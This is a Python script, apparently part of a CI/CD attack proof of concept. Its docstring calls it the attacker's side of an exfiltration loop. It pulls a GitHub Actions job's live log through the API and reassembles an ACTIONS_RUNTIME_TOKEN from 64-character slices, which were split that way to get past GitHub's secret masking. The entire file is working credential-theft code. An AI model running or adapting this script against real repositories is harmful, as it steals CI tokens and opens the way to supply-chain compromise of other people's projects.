#!/usr/bin/env python3
"""
harvest_token.py — the attacker's side of the stage-1 exfil loop.

Downloads the victim job's in-flight log through the Actions API (the same
channel an outside attacker used: read the streamed output live) and
reassembles the ACTIONS_RUNTIME_TOKEN from the DEPI_CHUNK slices.
Slices are 64 chars, so no slice contains the whole secret — which is why
GitHub's exact-string log masking never touched them.
"""

import json
import os
import re
import subprocess
import sys

REPO = os.environ.get("GITHUB_REPOSITORY", "garnet-labs/codex")
RUN_ID = os.environ.get("STAGE1_RUN_ID", "")

CHUNK_RE = re.compile(r"DEPI_CHUNK:([A-Z_]+):(\d{4}):(.{64})")


def gh(*args):
    return subprocess.run(
        ["gh", "api", *args], capture_output=True, text=True, check=False
    )


def main():
    if not RUN_ID:
        print("STAGE1_RUN_ID not set", file=sys.stderr)
        sys.exit(1)

    # Find the victim job in the stage-1 run.
    r = gh(f"repos/{REPO}/actions/runs/{RUN_ID}/jobs?per_page=100")
    if r.returncode != 0:
        print("jobs lookup failed: " + r.stderr[:400], file=sys.stderr)
        sys.exit(1)
    jobs = json.loads(r.stdout).get("jobs", [])
    if not jobs:
        print("no jobs found in run", file=sys.stderr)
        sys.exit(1)
    job = jobs[0]
    job_id = job["id"]
    print(f"victim job: {job['name']} (id {job_id}, status {job['status']})")

    # In-flight logs for that job.
    r = gh(f"repos/{REPO}/actions/jobs/{job_id}/logs")
    if r.returncode != 0:
        print("log download failed: " + r.stderr[:400], file=sys.stderr)
        sys.exit(1)
    log = r.stdout
    print(f"log captured: {len(log)} bytes (in-flight)")

    # Reassemble every labelled token from its ordered slices.
    found = {}
    counts = {}
    for line in log.splitlines():
        m = CHUNK_RE.search(line)
        if m:
            label, seq, data = m.group(1), int(m.group(2)), m.group(3)
            found.setdefault(label, {})[seq] = data
        m2 = re.search(r"DEPI_CHUNKS:([A-Z_]+):(\d+)", line)
        if m2:
            counts[m2.group(1)] = int(m2.group(2))

    for label, slices in sorted(found.items()):
        value = "".join(slices[k] for k in sorted(slices))
        expected = counts.get(label, len(slices))
        print(f"reassembled {label}: {len(value)} chars "
              f"({len(slices)}/{expected} slices)")
        if label == "ACTIONS_RUNTIME_TOKEN":
            print("DEPI_TOKEN=" + value)
    if "ACTIONS_RUNTIME_TOKEN" not in found:
        print("no ACTIONS_RUNTIME_TOKEN slices found in the log", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
